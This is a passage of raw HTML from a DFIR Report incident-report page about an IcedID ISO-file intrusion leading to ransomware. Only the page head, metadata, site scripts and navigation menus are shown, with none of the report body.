<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<title>Malicious ISO File Leads to Domain Wide Ransomware &#8211; The DFIR Report</title>
<meta name="robots" content="max-image-preview:large" />
<link rel="dns-prefetch" href="//stats.wp.com" />
<link rel="dns-prefetch" href="//c0.wp.com" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="cd9a07d5db3466cea3ec1774-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel="stylesheet" id="jetpack_related-posts-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css" type="text/css" media="all" />
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all" />
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2" type="text/css" media="all" />
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2" type="text/css" media="all" />
<link rel="stylesheet" id="freenews-google-fonts-css" href="https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css" type="text/css" media="all" />
<link rel="stylesheet" id="sharedaddy-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css" type="text/css" media="all" />
<link rel="stylesheet" id="social-logos-css" href="https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css" type="text/css" media="all" />
<script type="cd9a07d5db3466cea3ec1774-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/16873" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" />
<link rel="shortlink" href="https://thedfirreport.com/?p=16873" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F04%2F03%2Fmalicious-iso-file-leads-to-domain-wide-ransomware%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F04%2F03%2Fmalicious-iso-file-leads-to-domain-wide-ransomware%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="cd9a07d5db3466cea3ec1774-text/javascript"></script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="cd9a07d5db3466cea3ec1774-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=1201D513EFC03CC8EEF8C3D93F325DE9');
</script> <style>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="Malicious ISO File Leads to Domain Wide Ransomware" />
<meta property="og:url" content="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" />
<meta property="og:description" content="IcedID continues to deliver malspam emails to facilitate a compromise. This case covers the activity from a campaign in late September of 2022. Post exploitation activities detail some familiar and…" />
<meta property="article:published_time" content="2023-04-03T01:27:10+00:00" />
<meta property="article:modified_time" content="2024-05-16T12:13:24+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2023/04/18041-001.png" />
<meta property="og:image:width" content="2255" />
<meta property="og:image:height" content="1290" />
<meta property="og:image:alt" content />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Malicious ISO File Leads to Domain Wide Ransomware" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2023/04/18041-001.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-16873 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
